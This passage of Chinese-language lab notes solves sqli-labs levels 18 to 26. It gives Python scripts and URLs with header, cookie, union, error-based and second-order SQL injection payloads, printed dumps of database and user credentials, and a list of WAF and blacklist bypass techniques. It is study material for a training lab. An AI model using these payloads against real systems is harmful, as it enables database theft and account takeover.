	'Connection':'keep-alive',
	'Content-Type':'application/x-www-form-urlencoded',
	'Host':'127.0.0.1',
	'X-Forwarded-For':'8.8.8.8',
	'Origin':'http://127.0.0.1',
	'Referer':'http://127.0.0.1/sqli-labs-master/Less-18/',
	'Upgrade-Insecure-Requests':'1',
	'User-Agent':'\',updatexml(1,concat(0x5e,version(),0x5e),1),\''
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```



### 19-20

同18，但是注入段为Referer与cookie字段而不是user-agent

### 21-22

和19-20相同，但是多了一层base64的处理。

```
import requests
import base64

url = "http://192.168.1.101/sqli-labs-master/Less-21/"

postDate = {
	'uname':'admin',
	'passwd':'admin'
}

headers = {
	'Host':'127.0.0.1',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding':'gzip, deflate',
	'Referer':'http://127.0.0.1/Less-20/index.php',
	'Cookie':"uname="+base64.b64encode("\') union select 1,group_concat(schema_name),3 from information_schema.schemata-- "),
	'Connection':'keep-alive',
	'Upgrade-Insecure-Requests':'1',
	'Cache-Control':'max-age=0'
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```

```
YOUR COOKIE : uname = JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhLS0g and expires: Sun 12 Jul 2020 - 04:18:49<br></font><font color= "pink" font size="5">Your Login name:information_schema,challenges,mysql,performance_schema,security,test<br><font color= "grey" font size="5">Your Password:3</font></b><br>Your ID:1<center><form action="" method="post"><input  type="submit" name="submit" value="Delete Your Cookie!" /></form></center><br><br><br><br>
```

22中闭合方式为双引号没有括号:



### 23

过滤了#、--+。特殊注释符号$;\%00$

```
//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
```

**方法一 联合查询**

```
#查看显示位
http://192.168.1.101/sqli-labs-master/Less-23/?id=-1' union select 1,2,'3
##Your Login name:2
##Your Password:3

#各种爆
#爆库名
http://192.168.1.101/sqli-labs-master/Less-23/?id=1111' union select 1,2,group_concat(schema_name) from information_schema.schemata;%00
##Your Password:information_schema,challenges,mysql,performance_schema,security,test

#爆字段
http://192.168.1.101/sqli-labs-master/Less-23/?id=1111' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' ;%00


http://192.168.1.101/sqli-labs-master/Less-23/?id=-1' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '
##name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
##Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```



```
此处无法使用order by进行处理判断列数。
（坑位的判断可以通过order by 或者 union 联合查询进行 ）
原因：（中英切换太麻烦用英文表达）
if we use the the order by we will not get the wrong information beacuase of the closed treatment.
for example:
1.http://192.168.1.101/sqli-labs-master/Less-23/?id=1' or '1'='1 order by 10'
2.http://192.168.1.101/sqli-labs-master/Less-23/?id=1' order by 10 or '1'='1 
the first one when it analysis by the mysql,the'1 order by 10' will becomes the  entirety which will make it lost its function beacuse of the mysql will ignore the order by.
```

**报错注入**

```
http://113.54.234.152/sqli-labs-master/Less-23/?id=1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)or '1'='1

#limit 一个一个修改，也可以使用concat进行拼接一次输出（可能不全）
http://113.54.234.152/sqli-labs-master/Less-23/?id=1' and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata)),1)or '1'='1
#XPATH syntax error: '~information_schema,challenges,m' （不全）
```





### 24

二次注入：



首先使用admin：admin尝试登陆，登陆成功。

退出登陆，创建一个新账户：admin‘#：123

<img src="sql.assets/image-20200712152526862.png" alt="image-20200712152526862" style="zoom:67%;" />

之后对现在的账户进行修改密码：234

<img src="sql.assets/image-20200712152852960.png" alt="image-20200712152852960" style="zoom:67%;" />

之后神奇的事情来了，我们在次使用admin：234登陆发现登陆成功了。而admin：admin却显示登陆失败。说明我们通过操作将admin的密码修改了。

现在解释为什么能够修改：

```
一般而言修改密码的SQL语句为：
update users set password='$pass' where username='$username' and password='$curr_pass'
但是我们注册的admin'#让它成为
update users set password='$pass' where username='admin'#' and password='$curr_pass'
其等效于：
update users set password='$pass' where username='admin'
所以实现了修改密码的操作。
```



### 25-25a



#### 绕过

```
WAF绕过：
1.白盒绕过
	获得了源代码
2.黑盒绕过
	1.架构层面绕过waf
	主要针对云waf，找到源网站的真实地址，进行绕过，有点像CDN
	2.通过同网段绕过waf保护
	在一个网段中，可能经过的数据不会经过云waf，从而实现绕过
	3.协议层面绕过waf
		a.协议未覆盖绕过waf
		比如由于业务需要只对get型进行检测，post数据选择忽略。
		b.参数污染
		index?id=1&id=2 waf只能对id=1进行检测。
	4.规则层面的绕过
		a.sql注释符绕过
		--union /**/select
		--union /*！ */内联注释mysql特有
		b.空白符绕过
		--mysql空白符：%09;%0A;%0B;%0D;%20;%0C;%A0;/*XX*/
		--正则空白符：%09;%0A;%0B;%0D;%20;
		c.函数分隔符号
		--对函数进行分割绕过：concat%2520(   ;concat/**/(     等
		d.浮点数词法解释
		--waf对id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能无法检测
		e.利用error-based进行sql注入
		extractvalue(1, concat(0x5c,md5(3));
		updatexml(1, concat(0x5d,md5(3),1);
		Geometryollectiol(select*from(select*from(select@ @version)f)x))
		polygon((select* from(select name. const(versin(,1)x))
		linestring()
		multipoint()
		multilinestring()
		multipolygon()
		f.mysql特殊语法
		select{x schema_name} from {x information_schema.schemata};
		select{x 1};
		g.大小写绕过、关键字重复
		如果对关键字union or and等进行了过滤可以考虑大小写绕过
		h.关键字替换
		如果还是无法绕过可以考虑替换的方法：
		and->&&  or->||  like->=  <>->!=
		i.fuzz测试
		burpsuite配合手工进行测试。
```



题目中采用黑名单：

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
##对or、and大小写不敏感。
	return $id;
}
```



和其他题目一样只不过需要考虑绕过字符过滤

```
#联合注入
#爆库
http://113.54.234.152/sqli-labs-master/Less-25/?id=-1' union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata --+
##Your Password:information_schema,challenges,mysql,performance_schema,security,test
以上面为例：需要把出现过滤的内容进行复写即可绕过，其余操作一致

#爆所有内容的连接思路：新姿势
http://113.54.234.152/sqli-labs-master/Less-25/?id=-1' union select1,2,group_concat(concat_ws(0x7e,username,passwoord)) from security.users --+
##波浪号作为用户名和密码之间的内容分割符号
```



```
#报错注入
http://113.54.234.152/sqli-labs-master/Less-25/?id=-1' || updatexml(1,cancat(0x7e,(databas())),1)
##这样会没有闭合报错
http://113.54.234.152/sqli-labs-master/Less-25/?id=-1' || updatexml(1,cancat(0x7e,(databas())),1) || '1'='1
##报错反馈数据库信息

#爆库
http://113.54.234.152/sqli-labs-master/Less-25/?id=-1' || updatexml(1,cancat(0x7e.(select schema_name from infoorrmation_schema.schemata limit 0,1)),1)||'1'='1
##单个搜寻
```

```
#时间盲注
略
```



25a闭合方式不同，没有包合。



### 26

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

过滤了符号和空格，强制不考虑空格的时候，我们采用报错注入原本空格分割的地方套上括号即可。



### 26-a

































































```
https://www.cnblogs.com/ls-pankong/p/10493389.html
```

